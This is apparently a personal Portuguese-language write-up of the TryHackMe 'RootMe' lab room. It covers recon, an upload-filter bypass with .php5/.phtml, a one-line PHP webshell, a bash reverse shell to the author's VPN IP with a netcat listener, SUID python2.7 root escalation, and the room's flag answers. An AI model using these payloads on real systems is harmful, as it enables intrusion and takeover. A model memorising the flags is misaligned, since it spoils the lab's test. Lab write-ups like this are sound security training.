# RootMe — TryHackMe

Domingo à noite, sem nada pra fazer, falei "vou fazer uma easy rapidinha". Spoiler: não foi tão rapidinha porque eu travei na parte mais besta. Anotando tudo aqui de cabeça fresca pra não passar a mesma raiva de novo.

## 0. Subindo a máquina e conectando a VPN

Antes de qualquer coisa: subir a máquina na página da sala e conectar a VPN. Tem dois jeitos:

- **AttackBox da THM** — abre no navegador, não precisa configurar nada local. Bom pra quem tá com preguiça, ruim porque depende da internet da THM e o terminal laga.
- **Sua própria máquina + OpenVPN** — baixa o `.ovpn` da THM e conecta local. É o que eu uso, porque já tenho meus atalhos e ferramentas.

```bash
sudo openvpn ~/Downloads/minha-vpn.ovpn
```

Se nunca fez isso, vale fazer antes a salinha `OpenVPN` da própria THM, ela explica o passo a passo.

Depois de conectado, confere se ganhou IP e se o alvo responde:

```bash
ip a show tun0
ping 10.67.188.203
```

O meu `tun0` caiu como `192.168.129.84`. **Anota esse IP agora** — vai precisar dele no reverse shell depois. Eu sempre esqueço e tenho que voltar aqui, então fica a dica.

O ping voltou com `ttl=62`, que já entrega que é Linux. Tava no ar, bora.

Pra encurtar todos os comandos daqui pra frente:

```bash
TARGET=10.67.188.203
```

## 1. Reconhecimento

Regra de ouro: antes de explorar qualquer coisa, descobre o que tá rodando. Não chuta.

### Nmap

Primeiro um scan completo pra achar as portas:

```bash
nmap -p- -T4 $TARGET
```

- `-p-` varre as 65535 portas, não só as comuns
- `-T4` acelera sem ficar agressivo a ponto de perder pacote

Achou 2 portas. Aí rodei o detalhado só nelas:

```bash
nmap -p 22,80 -sV -sC $TARGET
```

- `-sV` descobre a versão de cada serviço
- `-sC` roda os scripts padrão do nmap, que já dão um monte de info de graça

Resultado:
- `22` — SSH, OpenSSH 8.2p1
- `80` — HTTP, Apache 2.4.41

Só duas portas, e a web é o caminho óbvio. Nem perdi tempo com SSH.

Abri `http://10.67.188.203` no navegador: página preta "HackIT - Home", "Can you root me?". Estática, sem login, sem nada clicável. O buraco tá escondido em diretório.

### Gobuster

Pra achar diretório escondido:

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt
```

- `dir` = enumerar diretórios
- `-u` = URL alvo
- `-w` = wordlist

(Confesso que errei duas vezes: esqueci o `-u` e errei o caminho da wordlist. Cada distro põe num lugar, né.)

Achou na hora:
- `/panel` — form de upload
- `/uploads` — pasta com listagem aberta, dava pra ver o que eu subia
- `/css`, `/js`

Quando você vê upload + pasta com listagem aberta, o cérebro acende: é ali.

## 2. Testando o upload

Abri o `/panel/`: form simples, escolhe arquivo, Upload. Abri o `/uploads/`: vazio, mas listando tudo.

Primeiro subi uma imagem aleatória qualquer — aceitou de boa. Então o filtro não é por tamanho nem nada, é por tipo.

Aí tentei o óbvio:

```bash
echo '<?php echo "pwned"; ?>' > test.php
```

Subi e tomei na cara:

> PHP não é permitido!

Olhando o código-fonte da página dá pra confirmar: tem uma blacklist bloqueando `.php`. Beleza, vamos de bypass.

## 3. O bypass — onde eu perdi 20 minutos

Fui testando as extensões clássicas, uma de cada vez: `.php5`, `.phtml`, `.php4`, `.phar`... Todas retornaram "sucesso". Fiquei feliz à toa.

Aqui foi meu erro de domingo: eu tinha baixado um `php-reverse-shell.php4` pronto e fiquei um tempão tentando fazer ele voltar shell. O arquivo ainda veio quebrado (umas 40 linhas com código cortado no meio). E o pior: eu não tinha percebido o detalhe principal.

**Subir não é executar.** Testei acessando cada um:

```bash
curl http://$TARGET/uploads/test.php5
curl http://$TARGET/uploads/test.phtml
curl http://$TARGET/uploads/test.php4
```

- `.php5` voltou só `pwned` — executou!
- `.phtml` voltou `pwned` — executou também
- `.php4` voltou o código-fonte inteiro — o Apache serviu como texto, não passou pelo PHP

Ou seja: o filtro barrava `.php`, mas `.php5` e `.phtml` passavam **e executavam**. O `.php4` subia mas não servia pra nada. Joguei ele fora e a vida andou.

## 4. Pegando shell

### O jeito rápido (webshell)

Desisti do reverse gigante e fui de webshell de uma linha, só pra validar:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
```

Subi pelo `/panel/` e testei:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=id"
```

```
uid=33(www-data) gid=33(www-data)
```

Quando vi `www-data` dei até uma risadinha sozinho. Tava dentro. Esse `shell.php5` virou meu terminal — era só trocar o `cmd`:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=whoami"
curl "http://$TARGET/uploads/shell.php5?cmd=ls -la"
```

### O jeito "de verdade" (reverse + listener)

O webshell resolve tudo, mas pra treinar o fluxo completo fiz também o reverse. Criei o arquivo com `nano`, colocando meu IP do `tun0` e a porta `4444`:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.84/4444 0>&1'"); ?>
```

Pra pegar teu IP no Linux:

```bash
ip a show tun0
# pega o inet, ex: 192.168.129.84
```

Se preferir o shell completo do pentestmonkey (o que mais funciona, recomendo esse pra quem tá começando):

```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

É só trocar `$ip` e `$port` lá dentro e salvar como `.phtml` ou `.php5`. Eu tentei uns 2 shells antes de achar um que conectava — normal, nem todo shell funciona de primeira.

Terminal 1, deixa ouvindo:

```bash
nc -lvnp 4444
```

Terminal 2, sobe e dispara:

```bash
curl -F "fileUpload=@rev.php5" -F "submit=Upload" http://$TARGET/panel/
curl http://$TARGET/uploads/rev.php5
```

Caiu no terminal 1. Shell reverso básico é horrível (sem autocomplete, quebra com Ctrl+C), então estabiliza logo:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 5. A primeira flag

Eu não sabia onde tava o `user.txt`, então procurei no sistema todo:

```bash
find / -iname "user.txt" 2>/dev/null
```

O `2>/dev/null` é pra jogar os erros de permissão fora e deixar a saída limpa.

Achou em `/var/www/user.txt` — não na home como eu jurava. Pra ler pelo webshell:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=cat /var/www/user.txt"
```

```
THM{y0u_g0t_a_sh3ll}
```

Nome justo: "you got a shell", kkk.

## 6. Escalação de privilégio

Com shell de `www-data`, o objetivo é virar root. O caminho aqui é binário com SUID.

### O que é SUID

SUID (Set User ID) é um bit especial que faz o programa rodar com o privilégio do **dono do arquivo**, não de quem executou. Se o dono é root e o bit tá ligado, qualquer usuário roda aquele binário como root.

Isso é legítimo pra coisas tipo `/usr/bin/passwd` (precisa escrever em `/etc/shadow`), mas se um binário estranho tiver esse bit, vira porta aberta pra root. A pergunta que guia toda escalação é: **o que aqui não deveria ter essa permissão?**

### Caçando SUIDs

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap
```

Varre o disco todo procurando o bit, descartando erro. Volta uma lista grande, quase tudo normal:

```
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/python2.7
...
```

Um destoa: **`/usr/bin/python2.7`**. Interpretador de linguagem com SUID não existe em instalação padrão nenhuma — é má configuração (nesse caso, intencional da sala). Confirmei:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=ls -l /usr/bin/python*"
```

```
-rwsr-xr-x 1 root root /usr/bin/python2.7
```

Aquele `s` em `rws` é o SUID. E como Python executa código arbitrário via `import os`, ter ele como root equivale a ter root. O GTFOBins documenta esse payload prontinho.

### Explorando

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Por partes:
- `import os` — módulo que fala com o sistema operacional
- `os.execl("/bin/sh", "sh", "-p")` — troca o processo atual por um `/bin/sh`
- `-p` — o detalhe que decide tudo: manda o shell **preservar o UID efetivo** herdado. Sem ele, o shell abre mão do privilégio por segurança e você cai num shell comum

Confere:

```bash
whoami
id
```

```
root
uid=33(www-data) gid=33(www-data) euid=0(root)
```

`euid=0(root)` = root efetivo. Escalou.

### A flag final

```bash
cat /root/root.txt
```

```
THM{pr1v1l3g3_3sc4l4t10n}
```

Pelo webshell, sem precisar de shell interativo, dá pra fazer direto:

```bash
curl "http://$TARGET/uploads/shell.php5?cmd=/usr/bin/python2.7 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\",\"-c\",\"cat /root/root.txt\")'"
```

## Resumo da sala

| Pergunta | Resposta |
|----------|----------|
| Portas abertas | 2 (22 SSH, 80 HTTP) |
| Versão Apache | 2.4.41 |
| Serviço porta 22 | SSH |
| Diretório oculto | `/panel/` |
| user.txt | `THM{y0u_g0t_a_sh3ll}` em `/var/www/user.txt` |
| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` em `/root/root.txt` |
| Vetor privesc | SUID em `/usr/bin/python2.7` |

## O que eu levo dessa noite

RootMe é simples, mas resume o ciclo inteiro de pentest web: enumeração revela mais que chute, upload mal validado vira porta de entrada, binário esquecido com permissão errada vira root.

1. **Subiu ≠ executou.** Valida com `echo pwned` antes do reverse. Teria me poupado 20 min.
2. **Não confia em shell pronto.** Abre e lê — o meu veio quebrado.
3. **Encurta os comandos.** `TARGET=` no começo + `?cmd=` direto. Escrever flag gigante pra tudo é sofrer à toa.
4. **Toda escalação começa com: o que aqui não deveria ter essa permissão?** Python com SUID grita de longe.

Valeu o domingo. Que venha a próxima easy — prometo não travar no upload de novo ( mentira, vou travar sim ).
